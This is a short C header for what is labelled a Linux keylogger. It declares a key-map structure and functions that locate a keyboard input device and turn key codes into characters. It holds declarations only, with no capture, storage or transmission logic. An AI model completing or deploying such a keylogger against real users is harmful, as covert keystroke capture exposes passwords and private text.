#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/input.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>

#define SYS_PATH_DEVICE_NAME "/sys/class/input/%s/device/name"
#define KEY_MAP_SIZE 128
#define MAX_KEY_LEN 24
#define BUFFER_SIZE 64

typedef struct {
    const char *normal;
    const char *shifted;
    const char *capslocked;
    const char *shifted_and_capslocked;
} key_map_t;

const char *get_key_name(uint16_t key_code, bool shift_pressed, bool capslock_active);
char *find_keyboard_device(const char *target_device_name);
char *get_keyboard_name(const char *path);

#endif  // KEYLOGGER_H
